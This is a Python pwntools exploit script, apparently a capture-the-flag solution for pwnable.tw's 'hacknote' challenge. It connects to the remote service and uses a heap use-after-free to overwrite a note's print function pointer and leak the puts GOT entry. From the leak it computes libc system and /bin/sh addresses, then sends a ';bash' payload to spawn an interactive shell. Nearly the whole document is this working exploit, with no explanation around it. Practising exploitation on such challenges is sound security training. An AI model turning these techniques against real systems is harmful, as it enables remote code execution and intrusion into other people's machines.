from pwn import *

def add(size,data):
	p.recvuntil("Your choice :")
	p.sendline("1")
	p.recvuntil("Note size :")
	p.sendline(str(size))
	p.recvuntil("Content :")
	p.sendline(data)
	p.recvuntil("Success !")

def delete(idx):
	p.recvuntil("Your choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(idx))
	p.recvuntil("Success")

def printh(idx):
	p.recvuntil("Your choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(idx))
	try:
		tmp = p.recvuntil("----------------------")
		return tmp[:tmp.find("----------------------")-1]
	except:
		return 0

if __name__ == '__main__':
#	p = process("./hacknote")
	p = remote("chall.pwnable.tw", 10102)

	heap_print = 0x0804862b
	puts_got = 0x804a024
	puts_offset = 0x0005f140
	system_offset = 0x0003a940
	binsh_offset = 0x00158e88
	#remote
	'''
	puts_offset = 0x0005FCA0
	system_offset = 0x0003ADA0
	binsh_offset = 0x0015B9A8
	#local
	'''
	add(24,"A"*23)
	add(24,"B"*23)
	delete(0)
	delete(1)
	add(12,p32(heap_print) + p32(puts_got))
	leak = u32(printh(0)[:4])
	print "[Leak] : 0x%x" % leak
	system = leak - puts_offset + system_offset
	binsh = leak - puts_offset + binsh_offset
	print "[System] : 0x%x" % system	
	pay = p32(system) +";bash"
	
	delete(2)
	add(9,pay)
	printh(0)
	p.interactive()

